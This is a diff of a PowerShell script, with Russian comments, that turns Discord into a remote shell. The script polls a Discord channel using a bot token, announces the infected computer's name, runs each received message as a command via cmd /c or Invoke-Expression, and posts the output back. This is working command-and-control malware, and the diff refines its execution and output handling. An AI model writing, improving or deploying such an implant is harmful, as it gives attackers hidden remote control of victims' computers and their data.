@@ -5,9 +5,7 @@ $previouscmd = ""
 $authenticated = 0
 
 function PullMsg {
-    $headers = @{
-        'Authorization' = "Bot $token"
-    }
+    $headers = @{ 'Authorization' = "Bot $token" }
     $webClient = New-Object System.Net.WebClient
     $webClient.Headers.Add("Authorization", $headers.Authorization)
     $result = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
@@ -52,10 +50,11 @@ Function Authenticate{
     } 
 }
 
-# ========== MAIN ==========
+# MAIN LOOP
 PullMsg
 $previouscmd = $response
 sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
+
 while ($true) {
     PullMsg
     if ($response -ne $previouscmd) {
@@ -75,21 +74,15 @@ while ($true) {
                 sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
             }
             else {
-                # Выполнение PowerShell и CMD команд
-                if ($response -match '^(ipconfig|ping|dir|date|whoami|echo)') {
-                    $Result = &cmd /c $response 2>&1
+                # Универсально: если команда начинается с двух или более слов — запускать через cmd /c, иначе через PowerShell
+                if ($response -match '^(ipconfig|ping|date|whoami|dir|echo)') {
+                    $Result = cmd /c $response 2>&1
                 } else {
                     $Result = try { iex($response) 2>&1 } catch { $_ }
                 }
-                if ($null -eq $Result -or $Result -eq "" -or ($Result -is [System.Management.Automation.ErrorRecord])) {
-                    $script:previouscmd = $response
-                    sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
-                    Start-Sleep -Milliseconds 250
-                    sendMsg "``PS | $dir>``"
-                }
-                else {
-                    $script:previouscmd = $response
-                    $output = ($Result | Out-String)
+                $script:previouscmd = $response
+                $output = ($Result | Out-String).Trim()
+                if ($output -ne "") {
                     $maxBatchSize = 1900
                     $total = $output.Length
                     for ($i=0; $i -lt $total; $i+=$maxBatchSize) {
@@ -97,8 +90,10 @@ while ($true) {
                         sendMsg "``````"
                         Start-Sleep -Milliseconds 250
                     }
-                    sendMsg "``PS | $dir>``"
+                } else {
+                    sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
                 }
+                sendMsg "``PS | $dir>``"
             }
         } else {
             Authenticate
